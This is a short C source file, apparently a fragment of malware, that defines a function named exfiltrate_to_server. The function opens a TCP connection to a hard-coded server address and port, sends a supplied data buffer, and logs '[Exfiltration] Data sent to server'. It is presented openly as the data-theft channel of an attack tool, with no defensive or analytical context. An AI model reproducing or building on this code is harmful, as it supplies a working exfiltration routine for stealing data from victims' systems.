#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

void exfiltrate_to_server(const char *data, size_t size) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(12345); // Port du serveur
    inet_pton(AF_INET, "127.0.0.1", &server.sin_addr); // Adresse IP du serveur

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
        send(sock, data, size, 0);
        printf("[Exfiltration] Data sent to server\n");
    } else {
        perror("Connection to server failed");
    }

    close(sock);
}
